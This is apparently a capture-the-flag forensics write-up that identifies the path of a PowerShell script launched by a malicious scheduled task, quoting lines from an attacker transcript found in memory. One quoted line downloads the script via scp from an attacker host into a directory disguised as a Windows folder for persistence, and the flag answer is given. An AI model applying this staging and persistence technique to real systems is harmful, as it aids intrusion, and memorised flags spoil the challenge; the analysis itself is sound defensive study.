# Cache Money — De Monne Breach (150 pts)

The scheduled task (WindowsTelemetryCheck) launches a PowerShell script from an unusual directory. What's the script's full Windows path?

## How I solved it

Same attacker PowerShell transcript blob in memory — the path shows up over and over:

```powershell
Host Application = powershell.exe -NoProfile -File C:\ProgramData\WindowsCache\telemetry.ps1
SetPropValue.Arguments("-NoProfile -File C:\ProgramData\WindowsCache\telemetry.ps1");
scp d34th@10.77.10.66:/home/d34th/telemetry.ps1 C:\ProgramData\WindowsCache\
Test-Path C:\ProgramData\WindowsCache\telemetry.ps1
```

So the full path is **C:\ProgramData\WindowsCache\telemetry.ps1** — "WindowsCache" masquerading as a legit Windows directory, staged from the attacker's box (`scp` from d34th@10.77.10.66, the rogue Kali device from Uninvited Guest).

A nice extra detail from the transcript: when it first ran, Windows' execution policy blocked the script — you can see the error string in memory too. Persistence achieved, but not without a hiccup.

## Flag

```
deadface{C:\ProgramData\WindowsCache\telemetry.ps1}
```
